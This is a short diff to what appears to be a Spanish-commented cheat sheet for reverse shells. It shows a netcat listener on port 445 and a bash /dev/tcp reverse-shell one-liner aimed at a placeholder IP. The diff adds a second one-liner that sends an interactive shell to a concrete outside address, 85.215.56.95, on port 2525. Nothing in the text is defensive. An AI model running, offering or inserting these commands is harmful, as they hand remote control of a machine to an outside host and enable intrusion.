@@ -7,3 +7,4 @@ sudo nc -lvnp 445
 
 # MAQUINA A INTECEPTAR: el comando se puede ejecutar como root o user
 bash -c 'bash -i >& /dev/tcp/{IP}/445 0>&1'
+bash -c 'bash -i >& /dev/tcp/85.215.56.95/2525 0>&1'
